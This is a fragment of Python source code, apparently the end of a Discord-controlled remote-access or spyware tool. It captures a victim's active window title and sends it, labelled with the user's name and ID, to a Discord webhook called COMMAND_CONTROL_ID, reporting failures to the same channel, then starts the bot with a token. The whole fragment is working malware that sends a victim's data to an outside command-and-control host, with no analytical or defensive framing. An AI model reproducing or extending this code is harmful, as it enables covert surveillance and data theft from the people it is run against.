            embed = DiscordEmbed(title=f"**Successfull Got CurrentWindow From: {usr} #{ID}**", description=f"{current_window}", color='09e30d')
            webhook.add_embed(embed)
            response = webhook.execute()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Failed Get Current Window From: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed) 
            response = webhook.execute()

bot.run(BOT_TOKEN)
